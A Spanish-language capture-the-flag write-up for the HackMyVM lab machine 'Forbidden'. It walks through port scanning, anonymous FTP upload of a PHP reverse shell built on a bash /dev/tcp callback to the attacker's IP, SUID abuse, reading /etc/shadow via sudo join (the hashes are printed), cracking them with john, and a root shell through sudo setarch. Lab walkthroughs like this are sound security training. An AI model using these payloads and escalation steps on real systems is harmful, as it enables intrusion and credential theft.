---
title:      "Forbidden"
excerpt:    "Continuamos con otra máquina medium, donde realizaremos varios user pivoting"
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/forbidden/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Medium
  - Linux
  - FTP
  - Brute force
  - SUID
  - Sudo abuse
---

![](/assets/images/forbidden/prev.png){: .align-center}

Continuamos con otra máquina medium, donde realizaremos varios user pivoting


## Reconocimiento de Puertos

Como es habitual, empezaremos averiguando la IP de la máquina víctima y realizando el reconocimiento de puertos con un pequeño [script](https://github.com/KaianPerez/nmapauto.sh) que creé para automatizar este proceso inicial:

~~~bash
❯ sudo nmapauto

 [*] La IP de la máquina víctima es 192.168.1.32

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 12:55 CEST
Initiating ARP Ping Scan at 12:55
Scanning 192.168.1.32 [1 port]
Completed ARP Ping Scan at 12:55, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:55
Scanning 192.168.1.32 [65535 ports]
Discovered open port 21/tcp on 192.168.1.32
Discovered open port 80/tcp on 192.168.1.32
Completed SYN Stealth Scan at 12:55, 1.22s elapsed (65535 total ports)
Nmap scan report for 192.168.1.32
Host is up, received arp-response (0.000053s latency).
Scanned at 2023-08-23 12:55:53 CEST for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:C3:5C:0B (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

 [*] Escaneo avanzado de servicios

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 12:55 CEST
Nmap scan report for 192.168.1.32
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jul 30 12:23 www [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.150
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:C3:5C:0B (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos 
~~~

En este punto, podemos ver que tenemos acceso vía FTP sin credenciales y el puerto 80. Veamos qué nos muestra el contenido web:

![](/assets/images/forbidden/index.png){: .align-center}

De alguna forma parece que nos está indicando varias pistas. Si miramos el recurso robots.txt, figura "note.txt", que contiene:

"The extra-secured .jpg file contains my password but nobody can obtain it."


### FTP

Veamos el acceso FTP ahora:

~~~bash
❯ ftp $ip
Connected to 192.168.1.32.
220 (vsFTPd 3.0.3)
Name (192.168.1.32:kaian): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55650|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jul 30 12:23 www
226 Directory send OK.
ftp> cd www
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||51494|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html
-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt
-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt
226 Directory send OK.
~~~

Aparentemente tenemos acceso al directorio donde está la web, por lo que podríamos tratar de subir una reverse shell, aunque aparentemente estará protegida para que no interprete php.


### Reverse shell

Creo una reverse shell en diferentes formatos como php* con la forma típica: `<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.150/1234 0>&1'"); ?>`

Los subo con put mediante ftp y me pongo a la escucha con: `nc -nlvp 1234`

Haciendo ensayo y error, veo que se ejecuta el fichero rev.php5 dándome una shell. Así que realizamos el [tratamiento de la TTY](https://kaianperez.github.io/tty/) y vamos a por la flag de user:

~~~bash
www-data@forbidden:/home/marta$ cd /home
www-data@forbidden:/home$ ls -lR
.:
total 12
drwxr-xr-x 3 markos markos 4096 Oct  9  2020 markos
drwxr-xr-x 3 marta  marta  4096 Oct  9  2020 marta
drwxr-xr-x 2 peter  peter  4096 Oct  9  2020 peter

./markos:
total 4
-rw------- 1 markos markos 12 Oct  9  2020 user.txt

./marta:
total 4
-rw-r--r-- 1 root root 130 Oct  9  2020 hidden.c

./peter:
total 0
www-data@forbidden:/home$ cat markos/user.txt 
cat: markos/user.txt: Permission denied
~~~

Vamos a revisar los permisos SUID:

~~~bash
www-data@forbidden:/$ find / -perm -4000 -ls 2>/dev/null
   266980     20 -rwsr-sr-x   1 root     marta       16712 Oct  9  2020 /home/marta/.forbidden
   135063     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
   131140     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   131139     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   149836    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo
   134728     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
   134581     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   131142     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   135065     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
   131144     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   132371     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   268440     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   146582    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
~~~

Tenemos un primer fichero bastante sospechoso, el cual al ejecutarlo me convirtió en *markos* y pude leer la flag de user:

~~~bash
www-data@forbidden:/home/markos$ /home/marta/.forbidden
markos@forbidden:/home/markos$ cat user.txt
~~~


## Escalada de privilegios

A partir de aquí me enfrasqué en un bucle sin salida. Sin embargo, si recordamos la pista de note.txt, nos indicaba que supuestamente la contraseña de *marta* estaba en un fichero .jpg:

~~~bash
markos@forbidden:~$ find / -name *.jpg 2>/dev/null
/var/www/html/TOPSECRETIMAGE.jpg
markos@forbidden:~/html$ su - marta
Password: 
marta@forbidden:~$
~~~

Lo que hemos hecho es utilizar como contraseña el nombre del fichero .jpg y ya somos *marta*.

Ahora revisaremos como siempre si podemos hacer uso de sudo:

~~~bash
marta@forbidden:/srv/ftp/www$ sudo -l
Matching Defaults entries for marta on forbidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marta may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/join
~~~

Aquí, lo que se me ocurre es utilizar este comando para poder leer el /etc/shadow y juntarlo con el /etc/passwd como si fuera un unshadow:

~~~bash
marta@forbidden:/srv/ftp/www$ sudo join -a 1 /etc/shadow /etc/passwd
root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::
daemon:*:18544:0:99999:7:::
join: /etc/shadow:3: is not sorted: bin:*:18544:0:99999:7:::
bin:*:18544:0:99999:7:::
join: /etc/passwd:2: is not sorted: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:*:18544:0:99999:7:::
sync:*:18544:0:99999:7:::
games:*:18544:0:99999:7:::
man:*:18544:0:99999:7:::
lp:*:18544:0:99999:7:::
mail:*:18544:0:99999:7:::
news:*:18544:0:99999:7:::
uucp:*:18544:0:99999:7:::
proxy:*:18544:0:99999:7:::
www-data:*:18544:0:99999:7:::
backup:*:18544:0:99999:7:::
list:*:18544:0:99999:7:::
irc:*:18544:0:99999:7:::
gnats:*:18544:0:99999:7:::
nobody:*:18544:0:99999:7:::
_apt:*:18544:0:99999:7:::
systemd-timesync:*:18544:0:99999:7:::
systemd-network:*:18544:0:99999:7:::
systemd-resolve:*:18544:0:99999:7:::
messagebus:*:18544:0:99999:7:::
marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::
systemd-coredump:!!:18544::::::
ftp:*:18544:0:99999:7:::
sshd:*:18544:0:99999:7:::
markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
~~~


### Fuerza bruta a hash

De esta forma, me guardo este contenido en un fichero llamado hash en mi máquina y vamos a tratar de usar fuerza bruta:

~~~bash
❯ john -w=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bxxxxr           (peter)     
~~~

Pivotamos a *peter*

~~~bash
marta@forbidden:~$ su - peter
Password: 
peter@forbidden:~$ 
~~~

Volvemos a revisar los permisos sudo con este user:

~~~bash
peter@forbidden:~$ sudo -l
Matching Defaults entries for peter on forbidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/setarch
~~~

Bien, ahora podemos utilizar la ayuda de <https://gtfobins.github.io/gtfobins/setarch/#sudo>

~~~bash
peter@forbidden:~$ sudo setarch $(arch) /bin/sh
-bash: /usr/bin/arch: Permission denied
setarch: /bin/sh: Unrecognized architecture
~~~

Nos ha capado el comando arch, no obstante, eso tiene fácil solución:

~~~bash
peter@forbidden:~$ uname -r
4.19.0-9-amd64
peter@forbidden:~$ sudo setarch x86_64 /bin/sh
# cd /root
# ls
root.txt
# cat root.txt
~~~

Máquina finalizada, agradecer a sml por la misma.